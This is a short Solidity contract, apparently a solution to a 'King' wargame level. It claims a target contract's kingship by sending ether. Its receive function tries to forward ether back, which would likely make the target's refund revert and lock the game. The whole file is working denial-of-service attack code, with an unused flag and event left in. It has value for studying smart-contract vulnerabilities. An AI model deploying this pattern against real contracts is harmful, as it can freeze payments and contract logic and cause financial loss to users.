pragma solidity ^0.8.0;

contract KingAttacker {
  address payable kingContract;
  bool protected = false;

  event Log(address addr);

  constructor(address payable _address) public payable {
    kingContract = _address;
    kingContract.call{ value: address(this).balance }("");
  }

  receive() external payable {
     kingContract.call{ value: address(this).balance }("");
  }

}
